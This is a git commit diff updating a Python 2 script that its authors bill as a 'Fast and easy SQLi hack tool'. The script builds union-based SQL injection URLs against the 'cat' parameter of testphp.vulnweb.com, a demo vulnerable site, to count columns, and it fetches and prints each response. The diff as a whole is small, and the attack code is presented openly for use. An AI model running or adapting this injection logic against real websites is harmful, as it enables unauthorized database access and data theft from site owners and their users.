e968fef59976995ef4b30fafab1c281a03ae2a61
The Cybers Team <roohbots@gmail.com>
2016-05-12 06:47:55 -0300

    Beta 0.2

--- sqli.py
+++ sqli.py
@@ -1,5 +1,5 @@
 import subprocess as sp
-import urllib
+import urllib as cybers
 sp.call('cls',shell=True)
 header="""
 ____ _              ___      _                     _____                      
@@ -10,22 +10,26 @@ ____ _              ___      _                     _____
                          |___/                                                 
 
 More: https://www.facebook.com/TheCybersTeam
-Fast and easy SQLi hack tool Beta 0.1
+Fast and easy SQLi hack tool Beta 0.2
 """
 print header
 
 url = "http://testphp.vulnweb.com/listproducts.php?cat="
 
+def getContent(url):
+    res = cybers.urlopen(url)
+    return res.read()
+
 def countColumns(url):
     print "Start Count Columns..."
     url = url + "-1 union select "
     start = 1
-    finish = 11
+    finish = 12
     for i in range(start,finish):
         if i != start and i != finish:
             url = url + ", "
-        url = url + str(i)
-        print url
+        url = url + "'Th3Cyb3rsT34m'"
+        print getContent(url)
 
 countColumns(url)
 
